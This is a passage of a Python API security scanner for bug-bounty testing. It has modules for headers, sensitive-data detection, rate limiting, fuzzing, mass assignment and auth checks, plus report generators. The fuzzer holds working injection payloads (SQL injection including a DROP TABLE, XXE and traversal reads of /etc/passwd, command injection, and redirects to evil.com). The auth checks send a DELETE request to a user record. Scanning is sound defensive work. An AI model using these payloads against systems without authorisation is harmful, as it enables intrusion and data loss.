                cvss=2.5, endpoint=url, tags=["headers","disclosure"],
            ))

    # HSTS strength
    hsts = hdrs.get("strict-transport-security","")
    if hsts:
        m = re.search(r"max-age=(\d+)", hsts)
        if m and int(m.group(1)) < 15_552_000:
            findings.append(Finding(
                title=f"HSTS max-age Too Short ({m.group(1)}s)",
                severity=Severity.LOW, module=MOD,
                description=f"HSTS max-age {int(m.group(1))//86400} days is below 180-day recommendation.",
                evidence=f"Strict-Transport-Security: {hsts}",
                remediation="Set max-age to at least 31536000 (1 year).",
                cwe="CWE-319", owasp="OWASP API8:2023",
                cvss=3.1, endpoint=url, tags=["headers","hsts"],
            ))

    return findings

# ── SENSITIVE DATA ─────────────────────────────────────────────────
SENSITIVE_PATTERNS = [
    ("Social Security Number", r"(?<!\d)\d{3}-\d{2}-\d{4}(?!\d)",
     Severity.CRITICAL, "CWE-359", 9.1, "Never expose SSNs. Remove from all API responses."),
    ("Credit Card Number",
     r"(?<!\d)(4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})(?!\d)",
     Severity.CRITICAL, "CWE-359", 9.1, "Use tokenisation. Never return full card numbers."),
    ("AWS Access Key", r"(?<![A-Z0-9])(AKIA|ASIA|AROA|AIDA)[A-Z0-9]{16}(?![A-Z0-9])",
     Severity.CRITICAL, "CWE-798", 9.8, "Rotate immediately. Use IAM roles instead of static keys."),
    ("Private Key", r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----",
     Severity.CRITICAL, "CWE-321", 9.8, "Revoke and reissue. Private keys must never appear in responses."),
    ("Database Connection String",
     r"(?i)(mongodb(\+srv)?://|mysql://|postgresql://|postgres://|redis://|Server=.*;Database=)",
     Severity.CRITICAL, "CWE-312", 9.1, "Remove debug endpoints. Store credentials in env vars only."),
    ("Generic API Key/Secret",
     r"(?i)(api_?key|api_?secret|client_?secret|access_?token|secret_?key)\s*[=:\"']+\s*[A-Za-z0-9_\-\.]{16,}",
     Severity.HIGH, "CWE-312", 7.5, "Remove credentials from responses. Rotate any exposed secrets."),
    ("JWT in Response Body",
     r"eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*",
     Severity.MEDIUM, "CWE-312", 5.3, "Avoid returning raw JWTs in response bodies."),
    ("Email Address", r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]{2,}",
     Severity.MEDIUM, "CWE-359", 5.3, "Mask or remove email addresses from API responses."),
    ("Stack Trace",
     r"(Traceback \(most recent|at [a-zA-Z_$][a-zA-Z0-9_$]*\.[a-zA-Z_$][a-zA-Z0-9_$]*\(|Exception in thread|java\.lang\.)",
     Severity.HIGH, "CWE-209", 7.5, "Return generic error messages. Log tracebacks server-side only."),
    ("Internal File Path", r"(/var/|/etc/|/home/|/usr/|/opt/|C:\\\\Users\\\\|/app/|/srv/)",
     Severity.MEDIUM, "CWE-209", 4.3, "Strip internal paths from all error messages."),
]

ERROR_PROBES = [
    ("GET", "/%00",         "null-byte"),
    ("GET", "/'",           "sql-quote"),
    ("GET", "/{{7*7}}",     "ssti"),
    ("GET", "/<script>x",   "xss"),
    ("GET", "/../../../",   "traversal"),
]

VERBOSE_INDICATORS = [
    "traceback","sqlexception","ora-","syntax error",
    "undefined variable","warning:","notice:","fatal error",
    "stack trace","exception in thread","django","werkzeug",
    "laravel","rails","symfony",
]

def scan_sensitive(http, url, auth_headers):
    findings = []
    MOD = "SensitiveScanner"

    resp = http.get(url, headers=auth_headers)
    if not resp:
        return findings

    body = resp["text"] or ""
    seen = set()

    for name, pattern, sev, cwe, cvss_val, fix in SENSITIVE_PATTERNS:
        matches = re.findall(pattern, body)
        if matches and name not in seen:
            seen.add(name)
            count = len(matches)
            evidence = (f"{count} match(es) [redacted for safety]"
                        if sev in (Severity.CRITICAL, Severity.HIGH)
                        else f"{count} match(es)")
            findings.append(Finding(
                title=f"Sensitive Data Exposure — {name}",
                severity=sev, module=MOD,
                description=f"{name} detected in API response body.",
                evidence=evidence,
                remediation=fix,
                cwe=cwe, owasp="OWASP API3:2023",
                cvss=cvss_val, endpoint=url,
                tags=["sensitive", name.lower().replace(" ","-")],
            ))

    # Error probing
    for method, suffix, probe_name in ERROR_PROBES:
        probe_url = url.rstrip("/") + suffix
        probe = http.get(probe_url, headers=auth_headers)
        if probe:
            body_lower = (probe["text"] or "").lower()
            matched = [i for i in VERBOSE_INDICATORS if i in body_lower]
            if matched:
                findings.append(Finding(
                    title=f"Verbose Error on {probe_name} Probe",
                    severity=Severity.MEDIUM, module=MOD,
                    description=f"Probe '{probe_name}' triggered verbose error indicators: {matched}",
                    evidence=f"HTTP {probe['status']} | Indicators: {matched}",
                    remediation="Return generic error messages. Log details server-side only.",
                    cwe="CWE-209", owasp="OWASP API3:2023",
                    cvss=5.3, endpoint=probe_url, tags=["sensitive","verbose-error"],
                ))

    return findings

# ── RATE LIMITING ──────────────────────────────────────────────────
IP_SPOOF_HEADERS = [
    "X-Forwarded-For","X-Real-IP","X-Originating-IP",
    "CF-Connecting-IP","True-Client-IP","X-Client-IP",
]

def scan_ratelimit(http, url, auth_headers, burst=30):
    findings = []
    MOD = "RateLimitScanner"

    codes = []
    latencies = []
    lock = threading.Lock()

    def req(_):
        t0 = time.monotonic()
        r = http.get(url, headers=auth_headers)
        el = time.monotonic() - t0
        with lock:
            codes.append(r["status"] if r else 0)
            latencies.append(el)

    threads = [threading.Thread(target=req, args=(i,)) for i in range(burst)]
    for t in threads: t.start()
    for t in threads: t.join()

    ok   = sum(1 for c in codes if c in (200,201,204))
    r429 = sum(1 for c in codes if c == 429)
    total = len(codes)

    if r429 == 0 and ok >= int(total * 0.85):
        findings.append(Finding(
            title="No Rate Limiting Detected",
            severity=Severity.HIGH, module=MOD,
            description=f"{ok}/{total} rapid requests succeeded with zero 429 responses.",
            evidence=f"Success: {ok}/{total} | 429s: {r429}",
            remediation="Implement rate limiting. Return 429 with Retry-After header.",
            cwe="CWE-799", owasp="OWASP API4:2023",
            cvss=7.5, endpoint=url, tags=["rate-limit","missing"],
        ))
    elif r429 > 0:
        findings.append(Finding(
            title="Rate Limiting Active",
            severity=Severity.INFO, module=MOD,
            description=f"Rate limiting detected: {r429}/{total} requests received 429.",
            evidence=f"429 count: {r429}/{total}",
            remediation="",
            endpoint=url, tags=["rate-limit","present"],
        ))

    # IP spoof bypass
    for hdr in IP_SPOOF_HEADERS:
        test_hdrs = {**auth_headers, hdr: "192.168.1.1"}
        r = http.get(url, headers=test_hdrs)
        if r and r["status"] in (200,201,204):
            findings.append(Finding(
                title=f"Rate Limit Bypass via {hdr}",
                severity=Severity.MEDIUM, module=MOD,
                description=f"Server trusts {hdr} for client identity. IP-based rate limits can be bypassed.",
                evidence=f"{hdr}: 192.168.1.1 → HTTP {r['status']}",
                remediation="Key rate limits on authenticated user identity, not IP address.",
                cwe="CWE-799", owasp="OWASP API4:2023",
                cvss=5.3, endpoint=url, tags=["rate-limit","bypass",hdr.lower()],
            ))
            break

    if latencies:
        avg = sum(latencies)/len(latencies)
        if avg > 3.0:
            findings.append(Finding(
                title="High Average Latency Under Burst Load",
                severity=Severity.MEDIUM, module=MOD,
                description=f"Mean response {avg:.2f}s during burst — DoS risk.",
                evidence=f"Mean={avg:.2f}s Max={max(latencies):.2f}s",
                remediation="Optimise endpoint. Add connection limits and timeouts.",
                cwe="CWE-400", owasp="OWASP API4:2023",
                cvss=5.3, endpoint=url, tags=["rate-limit","latency"],
            ))

    return findings

# ── FUZZER ────────────────────────────────────────────────────────
PAYLOADS = {
    "sqli":     ["' OR '1'='1","' OR 1=1--","1; DROP TABLE users--",
                 "' UNION SELECT NULL--","1' AND SLEEP(3)--"],
    "ssti":     ["${7*7}","{{7*7}}","{7*7}","<%= 7*7 %>"],
    "traversal":["../../../../etc/passwd","..\\..\\..\\windows\\win.ini",
                 "%2e%2e%2f%2e%2e%2fetc%2fpasswd","....//....//etc/passwd"],
    "xxe":      ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
    "ssi":      ["<!--#exec cmd=\"id\"-->","<!--#include virtual=\"/etc/passwd\"-->"],
    "open_redirect":["//evil.com","https://evil.com","//evil.com/%2f.."],
    "cmd":      ["; id","| id","&& id","` id`","$(id)"],
}

INDICATORS = {
    "sqli":      ["sql syntax","mysql_fetch","ora-","sqlite_","pg::","sqlexception","unclosed quotation"],
    "ssti":      ["49","7*7=49"],
    "traversal": ["root:x:0:0","/bin/bash","[fonts]","[extensions]"],
    "xxe":       ["root:x:0:0","SYSTEM","DOCTYPE"],
    "cmd":       ["uid=","gid=","root","www-data"],
    "ssi":       ["uid=","root","www-data"],
}

def check_injection(resp_text, category):
    if not resp_text:
        return False
    lower = resp_text.lower()
    for ind in INDICATORS.get(category, []):
        if ind in lower:
            return True
    return False

def scan_fuzz(http, url, auth_headers, params=None):
    findings = []
    MOD = "FuzzScanner"
    seen = set()

    # Path fuzzing
    for category, payloads in PAYLOADS.items():
        if category in ("xxe","open_redirect"):
            continue
        for payload in payloads[:2]:
            test_url = url.rstrip("/") + "/" + quote(payload, safe="")
            resp = http.get(test_url, headers=auth_headers)
            if resp and check_injection(resp["text"], category):
                key = f"path-{category}"
                if key not in seen:
                    seen.add(key)
                    sev = (Severity.CRITICAL if category in ("cmd","xxe")
                           else Severity.HIGH if category in ("sqli","traversal","ssti")
                           else Severity.MEDIUM)
                    findings.append(Finding(
                        title=f"Path Injection — {category.upper()} Indicator Found",
                        severity=sev, module=MOD,
                        description=f"Payload '{payload[:50]}' triggered {category} indicators in response.",
                        evidence=f"HTTP {resp['status']} | Indicator matched",
                        remediation={
                            "sqli":"Use parameterised queries.",
                            "ssti":"Never pass user input to template engines.",
                            "traversal":"Validate and canonicalise file paths.",
                            "cmd":"Never pass user input to shell commands.",
                        }.get(category,"Validate all input."),
                        cwe={"sqli":"CWE-89","ssti":"CWE-94","traversal":"CWE-22","cmd":"CWE-78"}.get(category,"CWE-20"),
                        owasp="OWASP API8:2023",
                        cvss=9.8 if category=="cmd" else 8.8,
                        endpoint=test_url, tags=["fuzz",category],
                    ))

            if resp and resp["status"] == 500 and category == "sqli":
                key = "path-sqli-500"
                if key not in seen:
                    seen.add(key)
                    findings.append(Finding(
                        title="500 Error on SQLi Probe",
                        severity=Severity.HIGH, module=MOD,
                        description=f"SQL payload caused HTTP 500 — unhandled exception in database layer.",
                        evidence=f"HTTP 500 on: {test_url}",
                        remediation="Use parameterised queries. Handle all DB exceptions gracefully.",
                        cwe="CWE-89", owasp="OWASP API8:2023",
                        cvss=7.5, endpoint=test_url, tags=["fuzz","sqli","500"],
                    ))

    # Query param fuzzing
    if params:
        for param in params:
            for category, payloads in PAYLOADS.items():
                if category in ("xxe","open_redirect","ssi","cmd"):
                    continue
                for payload in payloads[:1]:
                    test_url = f"{url.rstrip('/')}?{param}={quote(payload)}"
                    resp = http.get(test_url, headers=auth_headers)
                    if resp and check_injection(resp["text"], category):
                        key = f"param-{param}-{category}"
                        if key not in seen:
                            seen.add(key)
                            findings.append(Finding(
                                title=f"Parameter Injection — ?{param}= vulnerable to {category.upper()}",
                                severity=Severity.HIGH, module=MOD,
                                description=f"Param '{param}' with payload '{payload[:40]}' triggered {category}.",
                                evidence=f"GET {test_url} → HTTP {resp['status']}",
                                remediation="Validate and sanitise all query parameters.",
                                cwe={"sqli":"CWE-89","ssti":"CWE-94","traversal":"CWE-22"}.get(category,"CWE-20"),
                                owasp="OWASP API8:2023",
                                cvss=8.8, endpoint=test_url, tags=["fuzz",category,"param"],
                            ))

    # Open redirect
    for payload in PAYLOADS["open_redirect"]:
        test_url = f"{url.rstrip('/')}?url={payload}&redirect={payload}&next={payload}"
        resp = http.get(test_url, headers=auth_headers)
        if resp:
            loc = resp["headers"].get("Location","")
            if "evil.com" in loc:
                if "open_redirect" not in seen:
                    seen.add("open_redirect")
                    findings.append(Finding(
                        title="Open Redirect Vulnerability",
                        severity=Severity.MEDIUM, module=MOD,
                        description="Server redirects to attacker-controlled URL in Location header.",
                        evidence=f"Location: {loc}",
                        remediation="Validate redirect URLs against a whitelist of allowed destinations.",
                        cwe="CWE-601", owasp="OWASP API8:2023",
                        cvss=6.1, endpoint=test_url, tags=["fuzz","open-redirect"],
                    ))

    return findings

# ── MASS ASSIGNMENT ────────────────────────────────────────────────
def scan_mass_assignment(http, url, auth_headers):
    findings = []
    MOD = "MassAssignmentScanner"

    # Check write endpoints
    write_endpoints = []
    for path in ["/api/users","/api/user","/api/profile","/api/account",
                 "/api/checkout","/api/orders","/api/products"]:
        test_url = url.rstrip("/") + path if not url.endswith(path) else url
        resp = http.options(test_url, headers=auth_headers)
        if resp:
            allow = resp["headers"].get("Allow","")
            if any(m in allow.upper() for m in ["PUT","PATCH","POST"]):
                write_endpoints.append(test_url)

    if not write_endpoints:
        write_endpoints = [url]

    extra_fields = [
        {"isAdmin": True},
        {"role": "admin"},
        {"discount": 100},
        {"price": 0},
        {"balance": 999999},
        {"verified": True},
        {"credit": 1000},
    ]

    for ep in write_endpoints[:3]:
        # Get baseline
        baseline = http.get(ep, headers=auth_headers)
        if not baseline or baseline["status"] not in (200,201):
            continue

        for extra in extra_fields:
            field_name = list(extra.keys())[0]
            resp = http.post(ep, headers=auth_headers, body=extra)
            if resp and resp["status"] in (200,201):
                resp_text = resp["text"] or ""
                if (field_name in resp_text or
                    "admin" in resp_text.lower() or
                    "success" in resp_text.lower()):
                    findings.append(Finding(
                        title=f"Mass Assignment — Field '{field_name}' Accepted",
                        severity=Severity.HIGH, module=MOD,
                        description=f"Server accepted extra field '{field_name}' that should be server-controlled.",
                        evidence=f"POST {ep} with {extra} → HTTP {resp['status']}",
                        remediation="Use an explicit allowlist of accepted fields. Reject unknown fields.",
                        cwe="CWE-915", owasp="OWASP API3:2023",
                        cvss=8.8, endpoint=ep,
                        tags=["mass-assignment",field_name],
                    ))
                    break

    return findings

# ── AUTH CHECKS ────────────────────────────────────────────────────
def scan_auth(http, url, auth_headers, token):
    findings = []
    MOD = "AuthScanner"
    base = url.rstrip("/")

    # 1. Unauth endpoints
    unauth_paths = [
        "/api/admin","/api/admin/config","/api/admin/users",
        "/api/debug","/api/debug/env","/admin",
        "/api/users","/api/me","/api/profile",
        "/api/config","/api/settings","/actuator",
        "/actuator/health","/actuator/env","/metrics",
    ]
    for path in unauth_paths:
        test_url = base + path
        resp = http.get(test_url)   # no auth headers
        if resp and resp["status"] in (200,201) and len(resp["text"] or "") > 30:
            sev = (Severity.CRITICAL
                   if any(kw in path for kw in ["admin","debug","config","env"])
                   else Severity.HIGH)
            findings.append(Finding(
                title=f"Unauthenticated Access — {path}",
                severity=sev, module=MOD,
                description=f"{test_url} returns {resp['status']} with no Authorization header.",
                evidence=f"GET {test_url} → HTTP {resp['status']} (no token)",
                remediation="Apply authentication middleware to all protected routes.",
                cwe="CWE-306", owasp="OWASP API2:2023",
                cvss=9.1 if sev==Severity.CRITICAL else 7.5,
                endpoint=test_url, tags=["auth","unauth"],
            ))

    # 2. HTTP method override
    for hdr_name, hdr_val in [
        ("X-HTTP-Method-Override","GET"),
        ("X-HTTP-Method","GET"),
        ("X-Method-Override","GET"),
    ]:
        resp = http.post(base, headers={**auth_headers, hdr_name:hdr_val})
        if resp and resp["status"] in (200,201):
            findings.append(Finding(
                title="HTTP Method Override Accepted",
                severity=Severity.MEDIUM, module=MOD,
                description=f"POST + {hdr_name}:{hdr_val} returned {resp['status']}. Auth bypass possible.",
                evidence=f"POST {base} + {hdr_name}:{hdr_val} → HTTP {resp['status']}",
                remediation="Disable method override headers in production.",
                cwe="CWE-650", owasp="OWASP API5:2023",
                cvss=5.3, endpoint=base, tags=["auth","method-override"],
            ))
            break

    # 3. Broken function level auth — try admin actions as regular user
    admin_actions = [
        ("GET",    "/api/admin/users"),
        ("DELETE", "/api/users/1"),
        ("PUT",    "/api/users/1"),
        ("GET",    "/api/admin/config"),
    ]
    for method, path in admin_actions:
        test_url = base + path
        resp = http.request(method, test_url, headers=auth_headers)
        if resp and resp["status"] in (200,201,204):
            findings.append(Finding(
                title=f"Broken Function Level Auth — {method} {path}",
                severity=Severity.HIGH, module=MOD,
                description=f"Regular user can perform {method} on admin endpoint {path}.",
                evidence=f"{method} {test_url} → HTTP {resp['status']}",
                remediation="Check user role/permission before executing admin operations.",
                cwe="CWE-269", owasp="OWASP API5:2023",
                cvss=8.8, endpoint=test_url, tags=["auth","privilege-escalation"],
            ))

    return findings

# ══════════════════════════════════════════════════════════════════
# REPORTING
# ══════════════════════════════════════════════════════════════════

def print_finding(f: Finding):
    color = SEV_COLOR.get(f.severity, C.RESET)
    print(f"\n  {color}{C.BOLD}[{f.severity.value}]{C.RESET} {f.title}")
    if f.endpoint:
        print(f"  {C.DIM}  Endpoint: {f.endpoint}{C.RESET}")
    if f.evidence:
        ev = f.evidence.replace("\n"," | ")[:120]
        print(f"  {C.DIM}  Evidence: {ev}{C.RESET}")
    if f.remediation:
        print(f"  {C.GREEN}  Fix: {f.remediation[:100]}{C.RESET}")
    if f.cvss:
        print(f"  {C.DIM}  CVSS: {f.cvss} | {f.cwe or ''} | {f.owasp or ''}{C.RESET}")

def print_summary(findings, duration, target, discovered=None):
    counts = {s:0 for s in Severity}
    for f in findings:
        counts[f.severity] += 1

    print(f"\n{C.BOLD}{'═'*62}{C.RESET}")
    print(f"{C.BOLD}  SCAN COMPLETE — {target}{C.RESET}")
    print(f"{'═'*62}")

    if discovered:
        print(f"  {C.CYAN}Endpoints discovered: {len(discovered['all'])}{C.RESET}")
        print(f"  {C.DIM}API:{len(discovered['apis'])} GraphQL:{len(discovered['graphql'])} Auth:{len(discovered['auth'])} Swagger:{len(discovered['swagger'])}{C.RESET}")
        print()

    for sev in Severity:
        color = SEV_COLOR[sev]
        bar = "█" * min(counts[sev], 35)
        print(f"  {color}{sev.value:10s}{C.RESET}  {counts[sev]:4d}  {color}{bar}{C.RESET}")

    print(f"{'─'*62}")
    print(f"  {C.BOLD}Total findings:{C.RESET} {len(findings)}")
    print(f"  {C.BOLD}Scan duration:{C.RESET}  {duration:.1f}s")
    print(f"{'═'*62}\n")

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>API Security Scan — {target}</title>
<style>
:root{{--bg:#0f172a;--card:#1e293b;--border:#334155;--text:#e2e8f0;--muted:#94a3b8}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;padding:1.5rem}}
h1{{font-size:1.5rem;font-weight:600;color:#7dd3fc;margin-bottom:.25rem}}
h2{{font-size:1.1rem;font-weight:600;color:#bfdbfe;margin:1.5rem 0 .75rem}}
.meta{{color:var(--muted);font-size:.82rem;margin-bottom:1.25rem}}
.summary{{display:flex;gap:.75rem;flex-wrap:wrap;margin-bottom:1.5rem}}
.scard{{background:var(--card);border-radius:8px;padding:.7rem 1.2rem;min-width:85px;text-align:center;border:1px solid var(--border)}}
.scard .n{{font-size:2rem;font-weight:700}}
.scard .l{{font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em}}
.CRITICAL .n{{color:#ef4444}}.HIGH .n{{color:#f97316}}.MEDIUM .n{{color:#eab308}}
.LOW .n{{color:#22c55e}}.INFO .n{{color:#3b82f6}}
.disc{{background:var(--card);border-radius:8px;padding:1rem;margin-bottom:1.5rem;border:1px solid var(--border)}}
.disc h3{{font-size:.85rem;font-weight:600;color:#7dd3fc;margin-bottom:.5rem}}
.disc ul{{list-style:none;display:flex;flex-wrap:wrap;gap:.35rem}}
.disc li{{background:#0f172a;border-radius:4px;padding:.15rem .5rem;font-size:.75rem;font-family:'Courier New',monospace;color:#94a3b8}}
.finding{{background:var(--card);border-radius:8px;margin-bottom:.75rem;overflow:hidden;border:1px solid var(--border)}}
.fhead{{display:flex;align-items:center;gap:.75rem;padding:.65rem 1rem;cursor:pointer;transition:opacity .15s}}
.fhead:hover{{opacity:.85}}
.badge{{font-size:.62rem;font-weight:700;padding:.18rem .5rem;border-radius:4px;color:#fff;text-transform:uppercase;flex-shrink:0}}
.ftitle{{flex:1;font-weight:500;font-size:.88rem}}
.fmod{{font-size:.72rem;color:var(--muted)}}
.cvss{{font-size:.72rem;color:var(--muted);font-weight:600}}
.fbody{{display:none;padding:.9rem 1rem;border-top:1px solid var(--border)}}
.fbody.open{{display:block}}
table.dt{{width:100%;border-collapse:collapse;font-size:.82rem;margin-bottom:.75rem}}
table.dt td{{padding:.38rem .55rem;border-bottom:1px solid var(--border);vertical-align:top}}
table.dt .lbl{{color:var(--muted);width:100px;font-weight:500;white-space:nowrap}}
code{{background:#0f172a;padding:.1rem .28rem;border-radius:3px;font-size:.78rem;font-family:'Courier New',monospace;color:#7dd3fc}}
.tags{{display:flex;flex-wrap:wrap;gap:.3rem;margin-top:.5rem}}
.tag{{background:#1e3a5f;color:#7dd3fc;font-size:.68rem;padding:.12rem .38rem;border-radius:3px}}
.chevron{{color:var(--muted);font-size:.72rem;margin-left:auto}}
.disc-section{{margin-bottom:1.25rem}}
</style>
</head>
<body>
<h1>API Security Scan Report</h1>
<p class="meta">Target: <strong>{target}</strong> &nbsp;|&nbsp; {timestamp} &nbsp;|&nbsp;
Duration: {duration}s &nbsp;|&nbsp; Total: {total} findings &nbsp;|&nbsp;
Requests: {requests}</p>
<div class="summary">
{summary_cards}
</div>
{discovery_section}
{findings_html}
<script>
function toggle(id){{
  var b=document.getElementById(id+'b');
  b.classList.toggle('open');
}}
</script>
</body>
</html>"""

def build_html(findings, target, duration, requests, discovered=None):
    counts = {s:0 for s in Severity}
    for f in findings:
        counts[f.severity] += 1

    sev_colors = {
        Severity.CRITICAL:"#ef4444",Severity.HIGH:"#f97316",
        Severity.MEDIUM:"#eab308",Severity.LOW:"#22c55e",Severity.INFO:"#3b82f6",
    }
    sev_bgs = {
        Severity.CRITICAL:"#fef2f2",Severity.HIGH:"#fff7ed",
        Severity.MEDIUM:"#fefce8",Severity.LOW:"#f0fdf4",Severity.INFO:"#eff6ff",
    }

    cards = "".join(
        f'<div class="scard {s.value}"><div class="n">{counts[s]}</div>'
        f'<div class="l">{s.value}</div></div>'
        for s in Severity
    )

    disc_html = ""
    if discovered and discovered["all"]:
        def ep_list(eps, label, color):
            if not eps:
                return ""
            items = "".join(f'<li>{e.replace(target,"")}</li>' for e in eps[:30])
            return (f'<div class="disc-section"><h3 style="color:{color}">'
                    f'{label} ({len(eps)})</h3><ul>{items}</ul></div>')

        disc_html = (
            f'<div class="disc"><h2>Discovered Attack Surface</h2>'
            f'{ep_list(discovered["apis"],"API Endpoints","#22c55e")}'
            f'{ep_list(discovered["graphql"],"GraphQL","#a855f7")}'
            f'{ep_list(discovered["auth"],"Auth Endpoints","#eab308")}'
            f'{ep_list(discovered["swagger"],"Swagger / Docs","#3b82f6")}'
            f'</div>'
        )

    def f_html(f, i):
        sc = sev_colors[f.severity]
        bg = sev_bgs[f.severity]
        rows = ""
        if f.description:
            rows += f'<tr><td class="lbl">Description</td><td>{f.description}</td></tr>'
        if f.evidence:
            rows += f'<tr><td class="lbl">Evidence</td><td><code>{f.evidence}</code></td></tr>'
        if f.remediation:
            rows += (f'<tr><td class="lbl">Fix</td>'
                     f'<td style="color:#22c55e">{f.remediation}</td></tr>')
        refs = " | ".join(filter(None,[f.cwe,f.owasp]))
        if refs:
            rows += f'<tr><td class="lbl">References</td><td>{refs}</td></tr>'
        if f.endpoint:
            rows += f'<tr><td class="lbl">Endpoint</td><td><code>{f.endpoint}</code></td></tr>'
        tags = "".join(f'<span class="tag">{t}</span>' for t in f.tags)
        return (
            f'<div class="finding">'
            f'<div class="fhead" onclick="toggle(\'f{i}\')" '
            f'style="background:{bg};border-left:4px solid {sc}">'
            f'<span class="badge" style="background:{sc}">{f.severity.value}</span>'
            f'<span class="ftitle">{f.title}</span>'
            f'<span class="fmod">{f.module}</span>'
            f'<span class="cvss">CVSS {f.cvss}</span>'
            f'<span class="chevron">▼</span>'
            f'</div>'
            f'<div class="fbody" id="f{i}b">'
            f'<table class="dt">{rows}</table>'
            f'<div class="tags">{tags}</div>'
            f'</div></div>'
        )

    sorted_f = sorted(findings, key=lambda x: SEV_ORDER[x.severity])
    fhtml = "\n".join(f_html(f,i) for i,f in enumerate(sorted_f))
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    return HTML_TEMPLATE.format(
        target=target, timestamp=ts, duration=f"{duration:.1f}",
        total=len(findings), requests=requests,
        summary_cards=cards,
        discovery_section=disc_html,
        findings_html=fhtml,
    )

def build_csv(findings):
    out = io.StringIO()
    w = csv.DictWriter(out, fieldnames=[
        "severity","cvss","title","module","endpoint",
        "cwe","owasp","evidence","remediation","tags",
    ])
    w.writeheader()
    for f in sorted(findings, key=lambda x: SEV_ORDER[x.severity]):
        w.writerow({
            "severity":    f.severity.value,
            "cvss":        f.cvss,
            "title":       f.title,
            "module":      f.module,
            "endpoint":    f.endpoint or "",
            "cwe":         f.cwe or "",
            "owasp":       f.owasp or "",
            "evidence":    (f.evidence or "").replace("\n"," "),
            "remediation": (f.remediation or "").replace("\n"," "),
            "tags":        ",".join(f.tags),
        })
    return out.getvalue()

def build_markdown(findings, target, duration):
    counts = {s:0 for s in Severity}
    for f in findings: counts[f.severity] += 1
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    lines = [
        f"# API Security Scan Report", "",
        f"**Target:** `{target}`  ",
        f"**Generated:** {ts}  ",
        f"**Duration:** {duration:.1f}s  |  **Total:** {len(findings)} findings", "",
        "## Summary", "",
        "| Severity | Count | CVSS Range |",
        "|---|---|---|",
    ]
    cvss_ranges = {
        Severity.CRITICAL:"9.0-10.0",Severity.HIGH:"7.0-8.9",
        Severity.MEDIUM:"4.0-6.9",Severity.LOW:"0.1-3.9",Severity.INFO:"0.0",
    }
    for s in Severity:
        lines.append(f"| {s.value} | {counts[s]} | {cvss_ranges[s]} |")
    lines += ["","---","","## Findings",""]
    emojis = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🟢","INFO":"🔵"}
    for i,f in enumerate(sorted(findings,key=lambda x: SEV_ORDER[x.severity]),1):
        lines += [
            f"### {i}. {emojis.get(f.severity.value,'')} [{f.severity.value}] {f.title}","",
            f"**Module:** `{f.module}` | **CVSS:** {f.cvss}" +
            (f" | **Endpoint:** `{f.endpoint}`" if f.endpoint else ""),"",
        ]
        if f.description: lines += [f"**Description:** {f.description}",""]
        if f.evidence:    lines += [f"**Evidence:**\n```\n{f.evidence}\n```",""]
        if f.remediation: lines += [f"**Fix:** {f.remediation}",""]
        refs = " | ".join(filter(None,[f.cwe,f.owasp]))
        if refs: lines += [f"**References:** {refs}",""]
        lines += ["---",""]
    return "\n".join(lines)

def build_sarif(findings, target):
    rules = []
    seen_rules = set()
    results = []

    sev_level = {
        Severity.CRITICAL:"error",Severity.HIGH:"error",
        Severity.MEDIUM:"warning",Severity.LOW:"note",Severity.INFO:"none",
    }

    for f in findings:
        rule_id = re.sub(r'[^a-zA-Z0-9]','-',f.title.lower())[:60]
        if rule_id not in seen_rules:
            seen_rules.add(rule_id)
            rules.append({
                "id": rule_id,
                "name": f.title,
                "shortDescription":{"text":f.title},
                "fullDescription":{"text":f.description},
                "defaultConfiguration":{"level":sev_level[f.severity]},
                "properties":{
                    "tags":f.tags+["security","api"],
                    "security-severity":str(f.cvss),
                    "problem.severity":f.severity.value,
                },
            })
        results.append({
            "ruleId": rule_id,
            "level": sev_level[f.severity],
            "message":{"text":f"{f.description}\n\nEvidence: {f.evidence}\nFix: {f.remediation}"},
            "locations":[{"physicalLocation":{
                "artifactLocation":{"uri":f.endpoint or target,"uriBaseId":"%SRCROOT%"},
                "region":{"startLine":1},
            }}],
        })

    return json.dumps({
        "$schema":"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "version":"2.1.0",
        "runs":[{
            "tool":{"driver":{
                "name":"API Security Scanner",
                "version":VERSION,
                "informationUri":"https://github.com/yourusername/api-security-toolkit-standalone",
                "rules":rules,
            }},
            "results":results,
        }],
    }, indent=2)

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

def build_auth_headers(token):
    if not token:
        return {}
    t = token.strip()
    if not t.lower().startswith("bearer "):
        t = f"Bearer {t}"
    return {"Authorization": t}

def main():
    parser = argparse.ArgumentParser(
        description=f"API Security Scanner — Bug Bounty Edition v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full discovery + scan on any URL:
  python api_scanner.py --url https://target.com

  # Direct API URL — skip discovery, scan immediately:
  python api_scanner.py --url https://target.com/api/v1 --token YOUR_JWT

  # Discovery mode only — just map the attack surface:
  python api_scanner.py --url https://target.com --discover-only

  # Specific modules:
  python api_scanner.py --url https://target.com/api --module graphql --module headers

  # Save all report formats:
  python api_scanner.py --url https://target.com --output my_scan --format all

  # Fuzz specific parameters:
  python api_scanner.py --url https://target.com/api/search --module fuzz --params q,id,search

  # Against VulnAPI (local practice):
  python api_scanner.py --url http://localhost:5000 --full-scan
        """
    )
    parser.add_argument("--url",          "-u", required=True, help="Target URL (base or direct API)")
    parser.add_argument("--token",        "-t", default=None,  help="Bearer token / JWT / API key")
    parser.add_argument("--module",       "-m", action="append", default=[],
                        choices=["jwt","bola","auth","headers","ratelimit",
                                 "sensitive","fuzz","graphql","mass-assignment"],
                        help="Specific module(s) to run")
